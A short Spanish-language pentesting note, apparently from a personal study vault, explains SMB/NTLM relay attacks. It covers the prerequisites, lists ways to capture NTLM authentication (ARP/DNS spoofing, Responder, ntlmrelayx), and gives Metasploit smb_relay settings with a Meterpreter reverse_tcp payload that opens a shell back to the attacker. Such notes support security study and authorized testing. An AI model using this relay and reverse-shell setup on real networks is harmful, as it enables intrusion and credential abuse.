
---
- Tags:  #Windows #Network #SMB #Attacks #Exploitation #Hashes
- --- 
# Qué es? 

Es un ataque donde **NO SE CRACKEAN contraseñas**,  
sino que **reutilizamos una autenticación legítima** de una víctima para acceder a otro sistema.

La idea es: _“La víctima se autentica contra mí, y yo reenvío esa autenticación a otro servidor”_

## Requisitos:

- SMB signing Desactivado
- **NTLM** habilitado
- Obtener el **NTLM** de la víctima. 

# Explotación

## Manual

Podemos obtener el NTLM usando:

- **[[ARP Spoofing]]** 
- **[[DNS Spoofing]]**
- **[[Responder]]**

**Una vez teniendo el NTLM**

- **[[ntlmrelayx]]** 

## Metasploit

**Antes de hacer el MITM** Tenemos que prender el módulo de metasploit

```bash
exploit/windows/smb/smb_relay
```

**Parametros a modificar**:

```bash
set SRVHOST 172.16.5.101   # tu IP
set RHOST 172.16.5.10      # target
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.5.101
run
```



